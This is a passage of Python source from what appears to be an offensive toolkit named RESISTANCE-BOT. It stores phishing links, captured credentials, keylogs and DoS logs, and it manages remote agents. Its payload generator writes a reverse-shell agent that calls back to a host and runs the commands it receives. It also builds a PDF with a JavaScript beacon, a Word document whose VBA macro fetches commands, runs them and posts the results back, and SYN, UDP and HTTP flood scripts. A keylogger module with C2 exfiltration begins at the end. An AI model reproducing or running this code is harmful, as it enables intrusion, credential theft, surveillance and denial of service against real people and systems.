                import socket
                domain = socket.gethostbyaddr(ip)[0]
                if domain:
                    return domain
            except:
                pass
            return None
        except:
            return None
    
    def add_ssh_connection(self, conn: SSHConnection) -> bool:
        try:
            self.conn.execute(
                """INSERT OR REPLACE INTO ssh_connections 
                   (id, name, host, port, username, password_encrypted, key_path, status, created_at)
                   VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)""",
                (conn.id, conn.name, conn.host, conn.port, conn.username,
                 conn.password, conn.key_path, conn.status, conn.created_at)
            )
            self.conn.commit()
            return True
        except Exception as e:
            print(f"Failed to add SSH connection: {e}")
            return False
    
    def get_ssh_connections(self) -> List[Dict]:
        try:
            rows = self.conn.execute("SELECT * FROM ssh_connections ORDER BY name")
            return [dict(row) for row in rows]
        except:
            return []
    
    def log_ssh_command(self, connection_id: str, command: str, output: str,
                       exit_code: int, execution_time: float):
        try:
            self.conn.execute(
                """INSERT INTO ssh_commands 
                   (connection_id, command, output, exit_code, execution_time)
                   VALUES (?, ?, ?, ?, ?)""",
                (connection_id, command, output[:5000], exit_code, execution_time)
            )
            self.conn.commit()
        except Exception as e:
            print(f"Failed to log SSH command: {e}")
    
    def log_traffic(self, generator: TrafficGenerator, executed_by: str = "system"):
        try:
            self.conn.execute(
                """INSERT INTO traffic_logs 
                   (traffic_type, target_ip, target_port, duration, packets_sent, bytes_sent, status, executed_by)
                   VALUES (?, ?, ?, ?, ?, ?, ?, ?)""",
                (generator.traffic_type, generator.target_ip, generator.target_port,
                 generator.duration, generator.packets_sent, generator.bytes_sent,
                 generator.status, executed_by)
            )
            self.conn.commit()
        except Exception as e:
            print(f"Failed to log traffic: {e}")
    
    def log_nikto_scan(self, target: str, vulnerabilities: List[Dict], output_file: str,
                      scan_time: float, success: bool):
        try:
            self.conn.execute(
                """INSERT INTO nikto_scans (target, vulnerabilities, output_file, scan_time, success)
                   VALUES (?, ?, ?, ?, ?)""",
                (target, json.dumps(vulnerabilities), output_file, scan_time, success)
            )
            self.conn.commit()
        except Exception as e:
            print(f"Failed to log Nikto scan: {e}")
    
    def save_phishing_link(self, link: PhishingLink) -> bool:
        try:
            self.conn.execute(
                """INSERT INTO phishing_links (id, platform, phishing_url, template, created_at, clicks)
                   VALUES (?, ?, ?, ?, ?, ?)""",
                (link.id, link.platform, link.phishing_url, link.template, link.created_at, link.clicks)
            )
            self.conn.commit()
            return True
        except:
            return False
    
    def get_phishing_links(self, active_only: bool = True) -> List[Dict]:
        try:
            if active_only:
                rows = self.conn.execute("SELECT * FROM phishing_links WHERE active = 1 ORDER BY created_at DESC")
            else:
                rows = self.conn.execute("SELECT * FROM phishing_links ORDER BY created_at DESC")
            return [dict(row) for row in rows]
        except:
            return []
    
    def save_captured_credential(self, link_id: str, username: str, password: str,
                                 ip_address: str, user_agent: str):
        try:
            self.conn.execute(
                """INSERT INTO captured_credentials (phishing_link_id, username, password, ip_address, user_agent)
                   VALUES (?, ?, ?, ?, ?)""",
                (link_id, username, password, ip_address, user_agent)
            )
            self.conn.commit()
        except Exception as e:
            print(f"Failed to save credential: {e}")
    
    def get_captured_credentials(self, link_id: str = None) -> List[Dict]:
        try:
            if link_id:
                rows = self.conn.execute(
                    "SELECT * FROM captured_credentials WHERE phishing_link_id = ? ORDER BY timestamp DESC",
                    (link_id,)
                )
            else:
                rows = self.conn.execute("SELECT * FROM captured_credentials ORDER BY timestamp DESC")
            return [dict(row) for row in rows]
        except:
            return []
    
    def get_recent_threats(self, limit: int = 10) -> List[Dict]:
        try:
            rows = self.conn.execute(
                "SELECT * FROM threats ORDER BY timestamp DESC LIMIT ?", (limit,)
            )
            return [dict(row) for row in rows]
        except:
            return []
    
    def get_statistics(self) -> Dict:
        stats = {}
        try:
            stats['total_commands'] = self.conn.execute("SELECT COUNT(*) FROM command_history").fetchone()[0]
            stats['total_threats'] = self.conn.execute("SELECT COUNT(*) FROM threats").fetchone()[0]
            stats['total_managed_ips'] = self.conn.execute("SELECT COUNT(*) FROM managed_ips").fetchone()[0]
            stats['blocked_ips'] = self.conn.execute("SELECT COUNT(*) FROM managed_ips WHERE is_blocked = 1").fetchone()[0]
            stats['total_domain_hosts'] = self.conn.execute("SELECT COUNT(*) FROM domain_hosting").fetchone()[0]
            stats['total_ssh_connections'] = self.conn.execute("SELECT COUNT(*) FROM ssh_connections").fetchone()[0]
            stats['total_traffic_tests'] = self.conn.execute("SELECT COUNT(*) FROM traffic_logs").fetchone()[0]
            stats['total_phishing_links'] = self.conn.execute("SELECT COUNT(*) FROM phishing_links").fetchone()[0]
            stats['captured_credentials'] = self.conn.execute("SELECT COUNT(*) FROM captured_credentials").fetchone()[0]
            stats['total_keylogs'] = self.conn.execute("SELECT COUNT(*) FROM keylogs").fetchone()[0]
            stats['total_dos_attacks'] = self.conn.execute("SELECT COUNT(*) FROM dos_attacks").fetchone()[0]
            stats['total_agents'] = self.conn.execute("SELECT COUNT(*) FROM agents").fetchone()[0]
            stats['total_deployments'] = self.conn.execute("SELECT COUNT(*) FROM deployments").fetchone()[0]
            stats['total_payloads'] = self.conn.execute("SELECT COUNT(*) FROM payloads").fetchone()[0]
            stats['total_reports'] = self.conn.execute("SELECT COUNT(*) FROM reports").fetchone()[0]
        except:
            pass
        return stats
    
    def verify_user(self, username: str, password: str) -> Optional[Dict]:
        try:
            import hashlib
            password_hash = hashlib.sha256(password.encode()).hexdigest()
            row = self.conn.execute(
                "SELECT * FROM users WHERE username = ? AND password_hash = ?",
                (username, password_hash)
            ).fetchone()
            return dict(row) if row else None
        except:
            return None
    
    def create_session(self, user_id: int) -> str:
        try:
            session_id = secrets.token_urlsafe(32)
            expires_at = datetime.datetime.now() + datetime.timedelta(hours=24)
            self.conn.execute(
                "INSERT INTO sessions (id, user_id, expires_at) VALUES (?, ?, ?)",
                (session_id, user_id, expires_at.isoformat())
            )
            self.conn.commit()
            return session_id
        except:
            return None
    
    def verify_session(self, session_id: str) -> Optional[Dict]:
        try:
            row = self.conn.execute(
                """SELECT s.*, u.username, u.role 
                   FROM sessions s 
                   JOIN users u ON s.user_id = u.id 
                   WHERE s.id = ? AND s.expires_at > datetime('now')""",
                (session_id,)
            ).fetchone()
            return dict(row) if row else None
        except:
            return None
    
    def save_keylog(self, text: str, window: str = "", process: str = "", screenshot_path: str = ""):
        try:
            self.conn.execute(
                "INSERT INTO keylogs (text, window, process, screenshot_path) VALUES (?, ?, ?, ?)",
                (text[:5000], window[:100], process[:100], screenshot_path)
            )
            self.conn.commit()
        except Exception as e:
            print(f"Failed to save keylog: {e}")
    
    def get_keylogs(self, limit: int = 100) -> List[Dict]:
        try:
            rows = self.conn.execute("SELECT * FROM keylogs ORDER BY timestamp DESC LIMIT ?", (limit,))
            return [dict(row) for row in rows]
        except:
            return []
    
    def save_spear_phishing_campaign(self, campaign: 'SpearPhishingCampaign') -> bool:
        try:
            self.conn.execute(
                """INSERT OR REPLACE INTO spear_phishing_campaigns 
                   (id, name, template, subject, from_email, targets, sent_count, open_count, click_count, status, created_at, scheduled_time)
                   VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)""",
                (campaign.id, campaign.name, campaign.template, campaign.subject,
                 campaign.from_email, json.dumps(campaign.targets), campaign.sent_count,
                 campaign.open_count, campaign.click_count, campaign.status,
                 campaign.created_at, campaign.scheduled_time)
            )
            self.conn.commit()
            return True
        except Exception as e:
            print(f"Failed to save campaign: {e}")
            return False
    
    def get_spear_phishing_campaigns(self) -> List[Dict]:
        try:
            rows = self.conn.execute("SELECT * FROM spear_phishing_campaigns ORDER BY created_at DESC")
            return [dict(row) for row in rows]
        except:
            return []
    
    def track_email_open(self, campaign_id: str, target_email: str):
        try:
            self.conn.execute(
                """INSERT OR REPLACE INTO email_tracking 
                   (campaign_id, target_email, opened, opened_at)
                   VALUES (?, ?, 1, CURRENT_TIMESTAMP)""",
                (campaign_id, target_email)
            )
            self.conn.commit()
            self.conn.execute(
                "UPDATE spear_phishing_campaigns SET open_count = open_count + 1 WHERE id = ?",
                (campaign_id,)
            )
            self.conn.commit()
        except Exception as e:
            print(f"Failed to track email open: {e}")
    
    def track_email_click(self, campaign_id: str, target_email: str):
        try:
            self.conn.execute(
                """UPDATE email_tracking 
                   SET clicked = 1, clicked_at = CURRENT_TIMESTAMP 
                   WHERE campaign_id = ? AND target_email = ?""",
                (campaign_id, target_email)
            )
            self.conn.commit()
            self.conn.execute(
                "UPDATE spear_phishing_campaigns SET click_count = click_count + 1 WHERE id = ?",
                (campaign_id,)
            )
            self.conn.commit()
        except Exception as e:
            print(f"Failed to track email click: {e}")
    
    def log_dos_attack(self, attack_type: str, target: str, port: int, duration: int,
                      packets_sent: int, status: str, executed_by: str = "system"):
        try:
            self.conn.execute(
                """INSERT INTO dos_attacks 
                   (attack_type, target, port, duration, packets_sent, status, executed_by)
                   VALUES (?, ?, ?, ?, ?, ?, ?)""",
                (attack_type, target, port, duration, packets_sent, status, executed_by)
            )
            self.conn.commit()
        except Exception as e:
            print(f"Failed to log DOS attack: {e}")
    
    def get_dos_attacks(self, limit: int = 10) -> List[Dict]:
        try:
            rows = self.conn.execute("SELECT * FROM dos_attacks ORDER BY timestamp DESC LIMIT ?", (limit,))
            return [dict(row) for row in rows]
        except:
            return []
    
    def register_agent(self, agent_id: str, name: str, ip_address: str) -> bool:
        try:
            self.conn.execute(
                """INSERT OR REPLACE INTO agents (id, name, ip_address, status, last_heartbeat)
                   VALUES (?, ?, ?, 'online', CURRENT_TIMESTAMP)""",
                (agent_id, name, ip_address)
            )
            self.conn.commit()
            return True
        except Exception as e:
            print(f"Failed to register agent: {e}")
            return False
    
    def update_agent_heartbeat(self, agent_id: str):
        try:
            self.conn.execute(
                "UPDATE agents SET last_heartbeat = CURRENT_TIMESTAMP, status = 'online' WHERE id = ?",
                (agent_id,)
            )
            self.conn.commit()
        except Exception as e:
            print(f"Failed to update agent heartbeat: {e}")
    
    def add_agent_command(self, agent_id: str, command: str) -> bool:
        try:
            self.conn.execute(
                "INSERT INTO agent_commands (agent_id, command) VALUES (?, ?)",
                (agent_id, command)
            )
            self.conn.commit()
            return True
        except Exception as e:
            print(f"Failed to add agent command: {e}")
            return False
    
    def get_pending_agent_commands(self, agent_id: str) -> List[Dict]:
        try:
            rows = self.conn.execute(
                "SELECT * FROM agent_commands WHERE agent_id = ? AND status = 'pending' ORDER BY id",
                (agent_id,)
            )
            return [dict(row) for row in rows]
        except:
            return []
    
    def update_agent_command_result(self, command_id: int, result: str, status: str = "completed"):
        try:
            self.conn.execute(
                "UPDATE agent_commands SET result = ?, status = ?, executed_at = CURRENT_TIMESTAMP WHERE id = ?",
                (result[:5000], status, command_id)
            )
            self.conn.commit()
        except Exception as e:
            print(f"Failed to update agent command result: {e}")
    
    def get_agents(self) -> List[Dict]:
        try:
            rows = self.conn.execute("SELECT * FROM agents ORDER BY created_at DESC")
            return [dict(row) for row in rows]
        except:
            return []
    
    def get_agent(self, agent_id: str) -> Optional[Dict]:
        try:
            row = self.conn.execute("SELECT * FROM agents WHERE id = ?", (agent_id,)).fetchone()
            return dict(row) if row else None
        except:
            return None
    
    def save_network_packet(self, source_ip: str, dest_ip: str, source_port: int,
                           dest_port: int, protocol: str, size: int, payload: str = ""):
        try:
            self.conn.execute(
                """INSERT INTO network_packets 
                   (source_ip, dest_ip, source_port, dest_port, protocol, size, payload)
                   VALUES (?, ?, ?, ?, ?, ?, ?)""",
                (source_ip, dest_ip, source_port, dest_port, protocol, size, payload[:1000])
            )
            self.conn.commit()
        except Exception as e:
            print(f"Failed to save network packet: {e}")
    
    def get_network_packets(self, limit: int = 100) -> List[Dict]:
        try:
            rows = self.conn.execute("SELECT * FROM network_packets ORDER BY timestamp DESC LIMIT ?", (limit,))
            return [dict(row) for row in rows]
        except:
            return []
    
    def log_performance_metrics(self, cpu: float, memory: float, disk: float,
                               net_sent: int, net_recv: int, connections: int):
        try:
            self.conn.execute(
                """INSERT INTO performance_metrics 
                   (cpu_percent, memory_percent, disk_percent, network_sent, network_recv, connections_count)
                   VALUES (?, ?, ?, ?, ?, ?)""",
                (cpu, memory, disk, net_sent, net_recv, connections)
            )
            self.conn.commit()
        except Exception as e:
            print(f"Failed to log performance metrics: {e}")
    
    def get_performance_metrics(self, limit: int = 60) -> List[Dict]:
        try:
            rows = self.conn.execute("SELECT * FROM performance_metrics ORDER BY timestamp DESC LIMIT ?", (limit,))
            return [dict(row) for row in rows]
        except:
            return []
    
    def save_deployment(self, deployment: 'Deployment') -> bool:
        try:
            self.conn.execute(
                """INSERT OR REPLACE INTO deployments 
                   (id, name, type, payload, target, created_at, delivered, opened, executed, data)
                   VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)""",
                (deployment.id, deployment.name, deployment.type, deployment.payload,
                 deployment.target, deployment.created_at, deployment.delivered,
                 deployment.opened, deployment.executed, "{}")
            )
            self.conn.commit()
            return True
        except Exception as e:
            print(f"Failed to save deployment: {e}")
            return False
    
    def get_deployments(self) -> List[Dict]:
        try:
            rows = self.conn.execute("SELECT * FROM deployments ORDER BY created_at DESC")
            return [dict(row) for row in rows]
        except:
            return []
    
    def update_deployment_status(self, deployment_id: str, delivered: bool = None,
                                 opened: bool = None, executed: bool = None):
        try:
            updates = []
            if delivered is not None:
                updates.append(f"delivered = {1 if delivered else 0}")
            if opened is not None:
                updates.append(f"opened = {1 if opened else 0}")
            if executed is not None:
                updates.append(f"executed = {1 if executed else 0}")
            
            if updates:
                self.conn.execute(
                    f"UPDATE deployments SET {', '.join(updates)} WHERE id = ?",
                    (deployment_id,)
                )
                self.conn.commit()
        except Exception as e:
            print(f"Failed to update deployment: {e}")
    
    def save_clipboard(self, content: str, source: str = "system"):
        try:
            self.conn.execute(
                "INSERT INTO clipboard_history (content, source) VALUES (?, ?)",
                (content[:5000], source)
            )
            self.conn.commit()
        except Exception as e:
            print(f"Failed to save clipboard: {e}")
    
    def get_clipboard_history(self, limit: int = 50) -> List[Dict]:
        try:
            rows = self.conn.execute("SELECT * FROM clipboard_history ORDER BY timestamp DESC LIMIT ?", (limit,))
            return [dict(row) for row in rows]
        except:
            return []
    
    def save_payload(self, payload: 'Payload') -> bool:
        try:
            self.conn.execute(
                """INSERT OR REPLACE INTO payloads 
                   (id, name, payload_type, file_path, created_at, deployed, deployment_count, callback_host, callback_port)
                   VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)""",
                (payload.id, payload.name, payload.payload_type, payload.file_path,
                 payload.created_at, payload.deployed, payload.deployment_count,
                 payload.callback_host, payload.callback_port)
            )
            self.conn.commit()
            return True
        except Exception as e:
            print(f"Failed to save payload: {e}")
            return False
    
    def get_payloads(self, payload_type: str = None) -> List[Dict]:
        try:
            if payload_type:
                rows = self.conn.execute("SELECT * FROM payloads WHERE payload_type = ? ORDER BY created_at DESC", (payload_type,))
            else:
                rows = self.conn.execute("SELECT * FROM payloads ORDER BY created_at DESC")
            return [dict(row) for row in rows]
        except:
            return []
    
    def log_payload_deployment(self, payload_id: str, deployment_type: str, target: str, status: str = "pending"):
        try:
            self.conn.execute(
                """INSERT INTO payload_deployments (payload_id, deployment_type, target, status)
                   VALUES (?, ?, ?, ?)""",
                (payload_id, deployment_type, target, status)
            )
            self.conn.execute(
                "UPDATE payloads SET deployment_count = deployment_count + 1, deployed = 1 WHERE id = ?",
                (payload_id,)
            )
            self.conn.commit()
            return True
        except:
            return False
    
    def save_report(self, report_type: str, report_path: str, target: str = None, success: bool = True):
        try:
            self.conn.execute(
                "INSERT INTO reports (report_type, report_path, target, success) VALUES (?, ?, ?, ?)",
                (report_type, report_path, target, success)
            )
            self.conn.commit()
        except Exception as e:
            print(f"Failed to save report: {e}")
    
    def get_reports(self, limit: int = 20) -> List[Dict]:
        try:
            rows = self.conn.execute("SELECT * FROM reports ORDER BY timestamp DESC LIMIT ?", (limit,))
            return [dict(row) for row in rows]
        except:
            return []
    
    def close(self):
        try:
            self.conn.close()
        except:
            pass

# =====================
# REPORT GENERATOR
# =====================
class ReportGenerator:
    def __init__(self, db: DatabaseManager, config: ConfigManager):
        self.db = db
        self.config = config
    
    def generate_pdf_report(self, analysis_data: Dict, target: str) -> str:
        """Generate PDF report from analysis data"""
        try:
            if not PDF_AVAILABLE:
                return None
            
            timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
            report_filename = f"resistance_report_{target}_{timestamp}.pdf"
            report_path = os.path.join(REPORTS_DIR, report_filename)
            
            doc = SimpleDocTemplate(
                report_path,
                pagesize=A4,
                rightMargin=72,
                leftMargin=72,
                topMargin=72,
                bottomMargin=72
            )
            
            styles = getSampleStyleSheet()
            title_style = ParagraphStyle(
                'CustomTitle',
                parent=styles['Heading1'],
                fontSize=24,
                textColor=colors.HexColor('#1a73e8'),
                alignment=TA_CENTER,
                spaceAfter=30
            )
            
            story = []
            story.append(Paragraph("🛡️ RESISTANCE-BOT Security Report", title_style))
            story.append(Paragraph(f"Target: {target}", styles['Heading2']))
            story.append(Paragraph(f"Generated: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}", styles['Normal']))
            story.append(Spacer(1, 20))
            
            # Summary
            story.append(Paragraph("Executive Summary", styles['Heading2']))
            summary_text = f"""
            This report presents a comprehensive security analysis of <b>{target}</b>.
            The analysis was performed using RESISTANCE-BOT v{VERSION}.
            """
            story.append(Paragraph(summary_text, styles['Normal']))
            story.append(Spacer(1, 12))
            
            # Analysis results
            for key, value in analysis_data.items():
                if isinstance(value, dict):
                    story.append(Paragraph(key.replace('_', ' ').title(), styles['Heading3']))
                    for sub_key, sub_value in value.items():
                        if not isinstance(sub_value, (dict, list)):
                            story.append(Paragraph(f"• {sub_key.replace('_', ' ').title()}: {sub_value}", styles['Normal']))
                    story.append(Spacer(1, 10))
            
            # Recommendations
            if 'recommendations' in analysis_data:
                story.append(Paragraph("Recommendations", styles['Heading2']))
                for rec in analysis_data['recommendations']:
                    story.append(Paragraph(f"• {rec}", styles['Normal']))
            
            # Footer
            story.append(Spacer(1, 30))
            story.append(Paragraph(
                f"Report generated by RESISTANCE-BOT v{VERSION} | {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
                styles['Italic']
            ))
            
            doc.build(story)
            self.db.save_report('pdf', report_path, target, True)
            return report_path
        except Exception as e:
            logger.error(f"PDF report generation error: {e}")
            return None
    
    def generate_json_report(self, analysis_data: Dict, target: str) -> str:
        """Generate JSON report from analysis data"""
        try:
            timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
            report_filename = f"resistance_report_{target}_{timestamp}.json"
            report_path = os.path.join(REPORTS_DIR, report_filename)
            
            report_data = {
                'tool': NAME,
                'version': VERSION,
                'target': target,
                'timestamp': datetime.datetime.now().isoformat(),
                'analysis': analysis_data
            }
            
            with open(report_path, 'w') as f:
                json.dump(report_data, f, indent=2)
            
            self.db.save_report('json', report_path, target, True)
            return report_path
        except Exception as e:
            logger.error(f"JSON report generation error: {e}")
            return None
    
    def generate_report(self, analysis_data: Dict, target: str) -> Dict[str, str]:
        """Generate both PDF and JSON reports"""
        reports = {}
        
        if self.config.get('reporting.pdf_enabled', True):
            pdf_path = self.generate_pdf_report(analysis_data, target)
            if pdf_path:
                reports['pdf'] = pdf_path
        
        if self.config.get('reporting.json_enabled', True):
            json_path = self.generate_json_report(analysis_data, target)
            if json_path:
                reports['json'] = json_path
        
        return reports
    
    def generate_analysis_report(self, analysis_result: Dict, target: str) -> Dict[str, str]:
        """Generate analysis report from command result"""
        report_data = {
            'target': target,
            'timestamp': datetime.datetime.now().isoformat(),
            'result': analysis_result
        }
        return self.generate_report(report_data, target)

# =====================
# PAYLOAD GENERATOR
# =====================
class PayloadGenerator:
    def __init__(self, db: DatabaseManager, config: ConfigManager):
        self.db = db
        self.config = config
        self.callback_host = config.get('payload.default_callback', 'localhost')
        self.callback_port = config.get('payload.default_port', 4444)
    
    def generate_exe(self, name: str, callback_host: str = None, callback_port: int = None) -> Payload:
        payload_id = str(uuid.uuid4())[:8]
        callback_host = callback_host or self.callback_host
        callback_port = callback_port or self.callback_port
        
        file_name = f"{name}_{payload_id}.exe"
        file_path = os.path.join(PAYLOADS_DIR, file_name)
        
        template = f'''#!/usr/bin/env python3
import socket, subprocess, sys, time, os, json, platform, uuid, requests

CALLBACK_HOST = "{callback_host}"
CALLBACK_PORT = {callback_port}
AGENT_ID = str(uuid.uuid4())[:8]

def get_system_info():
    return {{"agent_id": AGENT_ID, "hostname": socket.gethostname(),
             "os": platform.system() + " " + platform.release(),
             "ip": socket.gethostbyname(socket.gethostname()),
             "user": os.getlogin(), "pid": os.getpid()}}

def execute_command(cmd):
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
        return {{"success": result.returncode == 0,
                 "output": result.stdout if result.stdout else result.stderr,
                 "exit_code": result.returncode}}
    except Exception as e:
        return {{"success": False, "output": str(e), "exit_code": -1}}

def main():
    print(f"RESISTANCE Agent {{AGENT_ID}} connecting to {{CALLBACK_HOST}}:{{CALLBACK_PORT}}")
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(10)
        sock.connect((CALLBACK_HOST, CALLBACK_PORT))
        while True:
            data = sock.recv(4096).decode('utf-8')
            if not data: break
            command = json.loads(data)
            result = execute_command(command.get('cmd', ''))
            sock.send(json.dumps(result).encode('utf-8'))
    except Exception as e:
        print(f"Error: {{e}}")

if __name__ == "__main__":
    main()
'''
        
        with open(file_path, 'w') as f:
            f.write(template)
        
        if PYINSTALLER_AVAILABLE:
            try:
                subprocess.run([
                    'pyinstaller', '--onefile', '--noconsole', '--name', file_name.replace('.exe', ''),
                    '--distpath', PAYLOADS_DIR, '--workpath', TEMP_DIR, file_path
                ], capture_output=True, timeout=60)
            except:
                pass
        
        payload = Payload(
            id=payload_id,
            name=name,
            payload_type="exe",
            file_path=file_path,
            created_at=datetime.datetime.now().isoformat(),
            callback_host=callback_host,
            callback_port=callback_port
        )
        
        self.db.save_payload(payload)
        return payload
    
    def generate_pdf(self, name: str, callback_host: str = None, callback_port: int = None) -> Payload:
        payload_id = str(uuid.uuid4())[:8]
        callback_host = callback_host or self.callback_host
        callback_port = callback_port or self.callback_port
        
        file_name = f"{name}_{payload_id}.pdf"
        file_path = os.path.join(PAYLOADS_DIR, file_name)
        
        pdf_content = f'''%PDF-1.7
1 0 obj
<< /Type /Catalog /Pages 2 0 R /OpenAction 3 0 R >>
endobj
2 0 obj
<< /Type /Pages /Kids [4 0 R] /Count 1 >>
endobj
3 0 obj
<< /Type /Action /S /JavaScript /JS (
  var host = "{callback_host}";
  var port = {callback_port};
  var agent_id = app.calculateNow().toString();
  try {{
    var xmlhttp = new XMLHttpRequest();
    var url = "http://" + host + ":" + port + "/pdf/ping/" + agent_id;
    xmlhttp.open("GET", url, false);
    xmlhttp.send();
  }} catch(e) {{ }}
) >>
endobj
4 0 obj
<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 5 0 R >>
endobj
5 0 obj
<< /Length 44 >>
stream
BT /F1 24 Tf 100 700 Td (RESISTANCE Security) Tj ET
endstream
endobj
xref
0 6
trailer << /Root 1 0 R >>
%%EOF
'''
        
        with open(file_path, 'w') as f:
            f.write(pdf_content)
        
        payload = Payload(
            id=payload_id,
            name=name,
            payload_type="pdf",
            file_path=file_path,
            created_at=datetime.datetime.now().isoformat(),
            callback_host=callback_host,
            callback_port=callback_port
        )
        
        self.db.save_payload(payload)
        return payload
    
    def generate_docx(self, name: str, callback_host: str = None, callback_port: int = None) -> Payload:
        payload_id = str(uuid.uuid4())[:8]
        callback_host = callback_host or self.callback_host
        callback_port = callback_port or self.callback_port
        
        file_name = f"{name}_{payload_id}.docx"
        file_path = os.path.join(PAYLOADS_DIR, file_name)
        
        if DOCX_AVAILABLE:
            doc = Document()
            doc.add_heading('RESISTANCE Security Report', 0)
            doc.add_paragraph('Please enable macros to view this document properly.')
            doc.add_paragraph('')
            doc.add_paragraph('Security vulnerabilities found:')
            
            vba_code = f'''
Private Sub Document_Open()
    Call RunPayload
End Sub

Sub RunPayload()
    On Error Resume Next
    Dim host As String
    Dim port As Integer
    Dim agent_id As String
    
    host = "{callback_host}"
    port = {callback_port}
    agent_id = CreateObject("Scripting.Dictionary").Count & "-" & Now
    
    On Error Resume Next
    Dim objXMLHTTP
    Dim objStream
    Set objXMLHTTP = CreateObject("MSXML2.ServerXMLHTTP")
    objXMLHTTP.Open "GET", "http://" & host & ":" & port & "/docx/ping/" & agent_id, False
    objXMLHTTP.Send
    
    Dim cmd
    cmd = objXMLHTTP.responseText
    If cmd <> "" Then
        Dim wsh
        Set wsh = CreateObject("WScript.Shell")
        Dim result
        result = wsh.Exec(cmd).StdOut.ReadAll
        objXMLHTTP.Open "POST", "http://" & host & ":" & port & "/docx/result/" & agent_id, False
        objXMLHTTP.Send result
    End If
End Sub
'''
            doc.add_paragraph('')
            doc.add_paragraph('=' * 50)
            doc.add_paragraph('VBA Macro Code:')
            doc.add_paragraph('')
            doc.add_paragraph(vba_code)
            doc.save(file_path)
        else:
            with open(file_path, 'w') as f:
                f.write(f"RESISTANCE DOCX Payload\nCallback: {callback_host}:{callback_port}\n")
        
        payload = Payload(
            id=payload_id,
            name=name,
            payload_type="docx",
            file_path=file_path,
            created_at=datetime.datetime.now().isoformat(),
            callback_host=callback_host,
            callback_port=callback_port
        )
        
        self.db.save_payload(payload)
        return payload
    
    def generate_link(self, name: str, url: str = None) -> Payload:
        payload_id = str(uuid.uuid4())[:8]
        file_name = f"{name}_{payload_id}.url"
        file_path = os.path.join(PAYLOADS_DIR, file_name)
        
        if not url:
            url = f"http://{self.callback_host}:{self.callback_port}/payload/{payload_id}"
        
        link_content = f"""[InternetShortcut]
URL={url}
IconFile=shell32.dll,1
IconIndex=1
HotKey=0
"""
        
        with open(file_path, 'w') as f:
            f.write(link_content)
        
        payload = Payload(
            id=payload_id,
            name=name,
            payload_type="link",
            file_path=file_path,
            created_at=datetime.datetime.now().isoformat(),
            callback_host=self.callback_host,
            callback_port=self.callback_port
        )
        
        self.db.save_payload(payload)
        return payload
    
    def generate_network_payload(self, name: str, target_ip: str, target_port: int = 80,
                                 attack_type: str = "syn") -> Payload:
        payload_id = str(uuid.uuid4())[:8]
        file_name = f"{name}_{payload_id}.py"
        file_path = os.path.join(PAYLOADS_DIR, file_name)
        
        template = f'''#!/usr/bin/env python3
import socket, time, sys, random, threading, requests, subprocess, os

TARGET_IP = "{target_ip}"
TARGET_PORT = {target_port}
ATTACK_TYPE = "{attack_type}"
CALLBACK_HOST = "{self.callback_host}"
CALLBACK_PORT = {self.callback_port}

def syn_flood(target, port):
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.1)
            sock.connect_ex((target, port))
            sock.close()
        except:
            pass

def udp_flood(target, port):
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.sendto(os.urandom(1024), (target, port))
            sock.close()
        except:
            pass

def http_flood(target, port):
    while True:
        try:
            import http.client
            conn = http.client.HTTPConnection(target, port, timeout=1)
            conn.request("GET", "/", headers={{"User-Agent": "RESISTANCE"}})
            conn.getresponse()
            conn.close()
        except:
            pass

def main():
    print(f"Starting {{ATTACK_TYPE}} attack on {{TARGET_IP}}:{{TARGET_PORT}}")
    if ATTACK_TYPE == "syn":
        syn_flood(TARGET_IP, TARGET_PORT)
    elif ATTACK_TYPE == "udp":
        udp_flood(TARGET_IP, TARGET_PORT)
    elif ATTACK_TYPE == "http":
        http_flood(TARGET_IP, TARGET_PORT)
    else:
        syn_flood(TARGET_IP, TARGET_PORT)

if __name__ == "__main__":
    main()
'''
        
        with open(file_path, 'w') as f:
            f.write(template)
        
        payload = Payload(
            id=payload_id,
            name=name,
            payload_type="network",
            file_path=file_path,
            created_at=datetime.datetime.now().isoformat(),
            callback_host=self.callback_host,
            callback_port=self.callback_port
        )
        
        self.db.save_payload(payload)
        return payload
    
    def deploy_payload(self, payload_id: str, deployment_type: str, target: str = None) -> Dict:
        payloads = self.db.get_payloads()
        payload = next((p for p in payloads if p['id'] == payload_id), None)
        
        if not payload:
            return {'success': False, 'error': f'Payload {payload_id} not found'}
        
        file_path = payload['file_path']
        if not os.path.exists(file_path):
            return {'success': False, 'error': f'Payload file not found: {file_path}'}
        
        self.db.log_payload_deployment(payload_id, deployment_type, target or 'unknown', 'deployed')
        
        return {
            'success': True,
            'message': f'Payload {payload_id} deployed via {deployment_type}',
            'payload_id': payload_id,
            'deployment_type': deployment_type
        }
    
    def list_payloads(self, payload_type: str = None) -> List[Dict]:
        return self.db.get_payloads(payload_type)

# =====================
# KEYLOGGER MODULE
# =====================
class KeyloggerModule:
    def __init__(self, db: DatabaseManager, config: ConfigManager):
        self.db = db
        self.config = config
        self.running = False
        self.listener = None
        self.text = ""
        self.current_window = ""
        self.current_process = ""
        self.log_file = config.get('keylogger.log_file', KEYLOG_FILE)
        self.c2_server = config.get('keylogger.c2_server', "")
        self.upload_interval = config.get('keylogger.upload_interval', 30)
        self.screenshot_interval = config.get('keylogger.screenshot_interval', 60)
        self.capture_clipboard = config.get('keylogger.capture_clipboard', True)
        self.upload_timer = None
        self.screenshot_timer = None
        self.clipboard_timer = None
        self.last_clipboard = ""
        self.exfil_methods = config.get('keylogger.exfil_methods', ["file", "email", "c2"])
    
    def start(self):
        if not KEYLOGGER_AVAILABLE:
            print(f"{Colors.ERROR}❌ Keylogger not available (pynput required){Colors.RESET}")
            return False
        
        if self.running:
            return True
        
        try:
            self.running = True
            self.text = ""
            
            self.listener = keyboard.Listener(on_press=self.on_press)
            self.listener.start()
            
            self.upload_timer = threading.Timer(self.upload_interval, self._upload_keylog)
